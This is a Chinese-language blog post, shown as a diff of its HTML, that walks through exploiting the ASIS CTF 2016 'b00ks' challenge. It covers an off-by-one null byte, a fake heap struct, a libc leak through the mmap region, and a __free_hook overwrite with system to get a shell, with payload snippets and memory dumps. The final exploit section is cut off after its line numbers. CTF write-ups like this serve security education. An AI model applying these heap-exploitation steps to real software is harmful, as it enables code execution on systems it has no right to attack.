@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x01一个图书管理12345678910Welcome to ASISCTF book libraryEnter author name: ha2ha2ha21. Create a book2. Delete a book3. Edit a book4. Print book detail5. Change current author name6. Exit&amp;gt; 程序漏洞程序中有一个用户自">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ha2">
+<meta property="og:url" content="http://yoursite.com/2019/03/17/Asis CTF 2016 b00ks/index.html">
+<meta property="og:site_name" content="ha2">
+<meta property="og:description" content="0x01一个图书管理12345678910Welcome to ASISCTF book libraryEnter author name: ha2ha2ha21. Create a book2. Delete a book3. Edit a book4. Print book detail5. Change current author name6. Exit&amp;gt; 程序漏洞程序中有一个用户自">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-03-17T15:13:41.517Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ha2">
+<meta name="twitter:description" content="0x01一个图书管理12345678910Welcome to ASISCTF book libraryEnter author name: ha2ha2ha21. Create a book2. Delete a book3. Edit a book4. Print book detail5. Change current author name6. Exit&amp;gt; 程序漏洞程序中有一个用户自">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/17/Asis CTF 2016 b00ks/"/>
+
+
+
+
+
+  <title> | ha2</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ha2</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/17/Asis CTF 2016 b00ks/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ha2">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha2">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline"></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-17T23:15:51+08:00">
+                2019-03-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="0x01一个图书管理"><a href="#0x01一个图书管理" class="headerlink" title="0x01一个图书管理"></a>0x01一个图书管理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Welcome to ASISCTF book library</span><br><span class="line">Enter author name: ha2ha2ha2</span><br><span class="line"></span><br><span class="line">1. Create a book</span><br><span class="line">2. Delete a book</span><br><span class="line">3. Edit a book</span><br><span class="line">4. Print book detail</span><br><span class="line">5. Change current author name</span><br><span class="line">6. Exit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="程序漏洞"><a href="#程序漏洞" class="headerlink" title="程序漏洞"></a>程序漏洞</h3><p>程序中有一个用户自己编写的my_read函数，会在 ptr + len+1处写入一个’\x00’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall my_read(_BYTE *ptr, int len)</span><br><span class="line">&#123;</span><br><span class="line">  int i; // [rsp+14h] [rbp-Ch]</span><br><span class="line">  _BYTE *buf; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( len &lt;= 0 )</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    return 0LL;</span><br><span class="line">  buf = ptr;</span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (unsigned int)read(0, buf, 1uLL) != 1 )</span><br><span class="line">      return 1LL;</span><br><span class="line">    if ( *buf == 10 )</span><br><span class="line">      break;</span><br><span class="line">    ++buf;</span><br><span class="line">    if ( i == len )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = 0;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>假如说len是32，输入32个字符之后，第33个会被置成\x00</p>
+<h3 id="0x01-泄漏book1-struct的地址。"><a href="#0x01-泄漏book1-struct的地址。" class="headerlink" title="0x01:泄漏book1_struct的地址。"></a>0x01:泄漏book1_struct的地址。</h3><p>Create_book的时候，会为book name mallloc、book descripeion、book strcut 分别malloc一块儿区域:。<br>其中book_struct是如下结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct book</span><br><span class="line">&#123;</span><br><span class="line">    int ID;</span><br><span class="line">    void* name;</span><br><span class="line">    void* description;</span><br><span class="line">    int desc_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>创建booki_struct后，会将该booki_strcut的地址放到BOOKS[i]中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data:000055ADE8F1B010 BOOKS           dq offset unk_55ADE8F1B060</span><br><span class="line">.data:000055ADE8F1B010                                         ; DATA XREF: sub_55ADE8D19B24:loc_55ADE8D19B38↑o</span><br><span class="line">.data:000055ADE8F1B010                                         ; Delete:loc_55ADE8D19C1B↑o ...</span><br><span class="line">.data:000055ADE8F1B018 Author_name     dq offset unk_55ADE8F1B040</span><br><span class="line">.data:000055ADE8F1B018                                         ; DATA XREF: Change_name+15↑o</span><br><span class="line">.data:000055ADE8F1B018                                         ; Print+CA↑o</span><br></pre></td></tr></table></figure>
+<p>可以看出BOOKS与Author_name相差0x20个字节。   </p>
+<p>所以如果Anthor写入32个字符后，第33个会被置成\x00，再create一个book的话，会将这个\x00会改掉，就可以在Print功能时，打印Author的时候泄漏处book1_struct的地址。   </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">### leak book1_struct     </span><br><span class="line">### 一开始程序运行输入&apos;A&apos;*32</span><br><span class="line">### 再create(&apos;128&apos;.&apos;A&apos;,&apos;128&apos;,&apos;B&apos;)  此处description的大小因尽量大些，原因请看后续(〃&apos;▽&apos;〃)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### [heap]:</span><br><span class="line">00005586DF65A010  00 00 00 00 00 00 00 00  91 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A020  41 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  A...............	&lt;=book1_name</span><br><span class="line">00005586DF65A030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A060  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A090  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A0A0  00 00 00 00 00 00 00 00  91 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A0B0  42 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  B...............	&lt;= book1_description	</span><br><span class="line">00005586DF65A0C0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A0D0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A0E0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A0F0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A100  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A110  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A120  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A130  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00  ........1.......	&lt;= book1_struct</span><br><span class="line">00005586DF65A140  01 00 00 00 00 00 00 00 &lt;=book1_ID 		        20 A0 65 DF 86 55 00 00  &lt;= book1_name的地址</span><br><span class="line">00005586DF65A150  B0 A0 65 DF 86 55 00 00 &lt;=book1_description的地址	80 00 00 00 00 00 00 00  &lt;= description的大小 </span><br><span class="line">	</span><br><span class="line">### BOOK 和 AuthorName</span><br><span class="line"></span><br><span class="line">AuthorName==&gt;</span><br><span class="line">00005586DF1E5040  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">00005586DF1E5050  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">BOOK ==&gt; </span><br><span class="line">00005586DF1E5060  40 A1 65 DF 86 55 00 00 &lt;= book1_struct的地址  00 00 00 00 00 00 00 00  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 再Print就能泄漏处book1_struct的地址了</span><br><span class="line">```    </span><br><span class="line">### 0x02:mmap</span><br><span class="line">由mmap映射出来的区域与libc有固定偏移，所以createbook2的时候，把大小申请得超级大，分配的区域就是mmap映射的，这里用的大小是0x21000</span><br></pre></td></tr></table></figure>
+<h3 id="mmap"><a href="#mmap" class="headerlink" title="[mmap]"></a>[mmap]</h3><p>00007F69E19B4000  00 00 00 00 00 00 00 00  02 20 02 00 00 00 00 00  ……… ……<br>00007F69E19B4010  43 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  C…………..        &lt;= book2_name<br>00007F69E19B4020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  …………….<br>00007F69E19B4030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  …………….<br>00007F69E19B4040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  …………….<br>…….   </p>
+<p>00007F69E1992000  00 00 00 00 00 00 00 00  02 20 02 00 00 00 00 00  ……… ……<br>00007F69E1992010  44 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  D……………    &lt;=book2_description<br>00007F69E1992020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  …………….<br>00007F69E1992030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  …………….<br>00007F69E1992040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  …………….<br>…….<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">[heap]</span><br><span class="line">00005586DF65A130  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00</span><br><span class="line">book1_struct =&gt;	</span><br><span class="line">00005586DF65A140  01 00 00 00 00 00 00 00  20 A0 65 DF 86 55 00 00  </span><br><span class="line">00005586DF65A150  B0 A0 65 DF 86 55 00 00  80 00 00 00 00 00 00 00  </span><br><span class="line">00005586DF65A160  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00 </span><br><span class="line">book2_struct =&gt;		</span><br><span class="line">00005586DF65A170  02 00 00 00 00 00 00 00 &lt;=book2_ID 		        10 40 9B E1 69 7F 00 00  &lt;=book2_name的地址		</span><br><span class="line">00005586DF65A180  10 20 99 E1 69 7F 00 00 &lt;=book2_description的地址	00 10 02 00 00 00 00 00  &lt;=book2description的大小</span><br></pre></td></tr></table></figure></p>
+<p>PS：book2_struct的地址这样是在book1_struct + 0x30 处的，泄漏了book1_struct的地址，即也泄漏了book2_struct的地址。</p>
+<h3 id="0x03-构造fake-book1-0字节覆盖"><a href="#0x03-构造fake-book1-0字节覆盖" class="headerlink" title="0x03:构造fake_book1  + 0字节覆盖"></a>0x03:构造fake_book1  + 0字节覆盖</h3><p>如果使用Changename函数，AuthorName依旧输入32个字符，那么第33处将会被置\x00，也就是会从上面变成如下所示的状态：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00005586DF1E5040  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa</span><br><span class="line">00005586DF1E5050  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa</span><br><span class="line">00005586DF1E5060  00 A1 65 DF 86 55 00 00  &lt;=book1_struct地址的低字节被\x00覆盖 ! 70 A1 65 DF 86 55 00 00  &lt;= book2_struct的地址</span><br></pre></td></tr></table></figure></p>
+<p>本来储存在BOOKS[0]里的book1_struct的地址由0x00005586DF65A140变成0x00005586DF65A100，所以我们应该把book1_description的地址弄得尽量大，这样就能使fake_book1_struct的地址是落在description的范围的，这样我们就能通过改写book1_description来完善这个fake_book1_struct。<br>这里我弄得的book1是128的name，128的description，book1 descriprion的范围是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">00005586DF65A0B0  42 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  B...............	&lt;= book1_description	</span><br><span class="line">00005586DF65A0C0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A0D0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A0E0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A0F0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A100  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A110  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A120  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### book1_struct的地址被覆盖后，</span><br><span class="line">### 由0x00005586DF65A140变成0x00005586DF65A100，</span><br><span class="line">### 0x00005586DF65A100是在book1_struct的范围内的。</span><br></pre></td></tr></table></figure></p>
+<p>所以我们可以在book1_description里构造一个fake_book1_struct：   </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">### payload = &apos;A&apos;*16*5 + p64(1) + p64(book1_addr+0x30+0x8) + p64(book1_addr+0x30+0x8) + p64(0xffff)</span><br><span class="line">### edit_book(&apos;1&apos;,payload)</span><br><span class="line"></span><br><span class="line">00005586DF65A0A0  00 00 00 00 00 00 00 00  91 00 00 00 00 00 00 00  ................</span><br><span class="line">00005586DF65A0B0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">00005586DF65A0C0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">00005586DF65A0D0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">00005586DF65A0E0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">00005586DF65A0F0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">fake_book1_struct   ==&gt;</span><br><span class="line">00005586DF65A100  01 00 00 00 00 00 00 00 &lt;= fake_book1_ ID	</span><br><span class="line">00005586DF65A108  78 A1 65 DF 86 55 00 00 &lt;= fake_book1_name的地址（其实00005586DF65A178里面存放的是book2_name的地址，这个地址很重要，前面说过，mmap映射的地址与libc有固定偏移，这样就可以在打印fake_book1_desciption的时候泄漏book2name的地址，也就是mmap映射的这块） </span><br><span class="line">00005586DF65A110  78 A1 65 DF 86 55 00 00 &lt;= fake_book1_desciption的地址（其实00005586DF65A178里面存放的是book2_name的地址，这个地址很重要，前面说过，mmap映射的地址与libc有固定偏移，这样就可以在打印fake_book1_desciption的时候泄漏book2name的地址，也就是mmap映射的这块） </span><br><span class="line">00005586DF65A118  FF FF 00 00 00 00 00 00 &lt;= fake_book1_desciption的大小</span><br><span class="line">00005586DF65A120  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br></pre></td></tr></table></figure>
+<p>PS：要先布置好fake_book1_struct，再去0字节覆盖.<br>布置fake_book1_struct要在0字节覆盖前一步完成，先Edit book1再ChangeNmae的话会失败，book1_description里的内容改不了，会出现”Can’t find selected book!”<br>先Edit再Change，Change还没完成（也就是fake_book1_struct还没布置好的时候）就Edit book1的话，会到00005586DF65A100里找ID匹配ID，但这时候，还没布置，里面值是0，ID匹配不上，会报错。</p>
+<h3 id="0x04-leak-book2-name的地址（mmap的区域）"><a href="#0x04-leak-book2-name的地址（mmap的区域）" class="headerlink" title="0x04:leak book2_name的地址（mmap的区域）"></a>0x04:leak book2_name的地址（mmap的区域）</h3><p>Print book1就会泄漏处book2_name的地址，原因前面说啦<br>但是再理一理叭 (〃’▽’〃)<br>现在BOOK1里是如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00005586DF1E5060  00 A1 65 DF 86 55 00 00  &lt;= fake_book1_struct的地址 (book1_struct地址的低字节被\x00覆盖)</span><br><span class="line">00005586DF1E5068  70 A1 65 DF 86 55 00 00  &lt;= book2_struct的地址</span><br><span class="line">.........</span><br></pre></td></tr></table></figure></p>
+<p>fake_book1_struct里如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fake_book1_struct   ==&gt;</span><br><span class="line">00005586DF65A100  01 00 00 00 00 00 00 00 &lt;= fake_book1_ ID	</span><br><span class="line">00005586DF65A108  78 A1 65 DF 86 55 00 00 &lt;= fake_book1_name的地址</span><br><span class="line">00005586DF65A110  78 A1 65 DF 86 55 00 00 &lt;= fake_book1_desciption的地址</span><br><span class="line">00005586DF65A118  FF FF 00 00 00 00 00 00 &lt;= fake_book1_desciption的大小 ................</span><br></pre></td></tr></table></figure></p>
+<p>0x00005586DF65A178里如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00005586DF65A178  10 40 9B E1 69 7F 00 00  &lt;=book2_name的地址（mmap映射的区域）</span><br></pre></td></tr></table></figure></p>
+<p>Print book1 name 或者 description的时候都会泄漏出book2_name的地址</p>
+<h3 id="0x05-触发"><a href="#0x05-触发" class="headerlink" title="0x05 触发"></a>0x05 触发</h3><p>这里通过 调用free函数时，由于__free_hook里面的内容不为NULL，从而执行指向的指令。<br>泄漏出mmap映射的区域之后，就可以通过与libc的固定偏移得到libc的运行基址。<br>进而可以找到free_hook函数的地址，system函数的地址，’/bin/sh’的地址。    </p>
+<h5 id="1、设置-free-hook里为system的地址"><a href="#1、设置-free-hook里为system的地址" class="headerlink" title="1、设置__free_hook里为system的地址"></a>1、设置__free_hook里为system的地址</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">### payload = p64(binsh_addr) + p64(free_hook)</span><br><span class="line">### edit_book(&apos;1&apos;,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_book1_description （book2_struct） ==&gt;</span><br><span class="line">00005586DF65A178  57 AD 6C 80 21 7F 00 00 &lt;= binsh_addr</span><br><span class="line">00005586DF65A180  A8 47 90 80 21 7F 00 00 &lt;=free_hook</span><br></pre></td></tr></table></figure>
+<p>这里就把book2_struct里的book2_description编程了free_hook的地址，等下再edit 2的时候就是在往free里写字。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">### payload = p64(system_addr)</span><br><span class="line">### edit_book(&apos;2&apos;,payload)</span><br><span class="line"></span><br><span class="line">edit(2,payload)</span><br><span class="line">free_hook ==&gt;</span><br><span class="line">00007F21809047A8  90 33 58 80 21 7F 00 00</span><br></pre></td></tr></table></figure></p>
+<p>调用free函数时，由于<strong>free_hook里面的内容不为NULL，从而执行指向的指令。<br>PS这里Delete book1的时候传的参是fake_book1_struct 里的name那个，布置成/bin/sh的地址，调用free的时候，就会把/bin/sh压入栈中，然后</strong>free_hook里不为空且布置成了system函数的地址，所以跳转过去执行system函数，就getshell啦。<br>妙啊 这些内存！(๑′ᴗ‵๑)</p>
+<h3 id="0x06完整exp"><a href="#0x06完整exp" class="headerlink" title="0x06完整exp"></a>0x06完整exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 